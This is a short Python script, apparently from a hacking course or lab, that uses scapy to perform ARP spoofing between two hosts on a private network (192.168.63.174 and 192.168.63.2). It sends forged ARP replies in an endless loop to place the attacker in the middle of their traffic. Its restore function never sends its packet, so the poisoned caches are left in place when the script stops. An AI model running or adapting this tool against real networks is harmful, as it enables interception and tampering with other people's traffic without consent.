#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, get_mac_address):
    target_mac = get_mac_address(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

def restore(destination_ip, source_ip, get_mac_address):
    target_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
# restore("192.168.63.174", "192.168.63.2", get_mac)

sent_packets_count = 0
try:
    while True:
        spoof("192.168.63.174","192.168.63.2", get_mac)
        spoof("192.168.63.2","192.168.63.174", get_mac)
        sent_packets_count += 2
        print("\r[+] Packet Count: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C ...... Quitting.")